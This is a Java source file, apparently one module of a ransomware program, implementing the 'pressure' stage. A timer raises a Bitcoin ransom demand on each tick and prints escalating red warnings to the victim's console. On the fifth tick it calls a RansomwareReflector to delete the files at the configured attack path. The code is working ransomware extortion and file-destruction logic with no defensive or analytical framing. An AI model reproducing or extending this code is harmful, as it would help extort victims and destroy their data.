package pressurize;

import configuration.Configuration;
import configuration.ConsoleCorrespondation;
import console.Console;
import console.TextColor;
import leverCom.RansomwareReflector;
import person.IConsoleUser;

import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;

public class Pressurize implements IConsoleUser {
    private final Console console;
    private Long delay;
    private Integer timerCount = 0;
    //private Boolean isPaid = false;
    private final RansomwareReflector reflector;
    private Timer timer;

    public Pressurize(Console console, Long delay) {
        this.delay = delay;
        this.console = console;
        this.reflector = new RansomwareReflector();
        this.reflector.setPath(Configuration.instance.pathToAttack);
    }

    public void invokeTimer() {
        try{
            if(Objects.nonNull(this.timer)) throw new Exception("Timer already instantiated");
            this.timer = new Timer();
            TimerTask task = new TimerTask() {
                @Override
                public void run() {
                    timerCount++;
                    Double toPay = 0.02755 + timerCount * 0.01;

                    if (timerCount < 4) {
                        //ConsoleCorrespondation.M_RANSOMINCREASED.setValue(ConsoleCorrespondation.M_RANSOMINCREASED.getValue() + toPay + " BTC");
                        writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED, TextColor.RED);
                        writeToConsole(toPay + " BTC", TextColor.RED);

                    } else {
                        ConsoleCorrespondation.M_RANSOMFINAL.setValue(toPay + ConsoleCorrespondation.M_RANSOMFINAL.getValue());
                        writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED);
                    }
                    if (timerCount < 5) invokeTimer();

                    if (timerCount == 5) {
                        //TODO check if we can do this via CC --> just one instance of Reflector
                        reflector.delete();
                    }
                }
            };
            timer.schedule(task, this.delay);
        }catch (Exception ex){
            System.err.println(ex.getMessage());
            ex.printStackTrace();
        }
    }

    public void cancelTimer(){
        this.timer.cancel();
        this.timer.purge();
        this.timer = null;
    }

    @Override
    public void writeToConsole(ConsoleCorrespondation text, TextColor color) {
        this.console.writeln(text, color);
    }

    public void writeToConsole(String text, TextColor color) {
        this.console.writeln(text, color);
    }

    public void writeToConsole(ConsoleCorrespondation text) {
        this.console.writeln(text);
    }
}

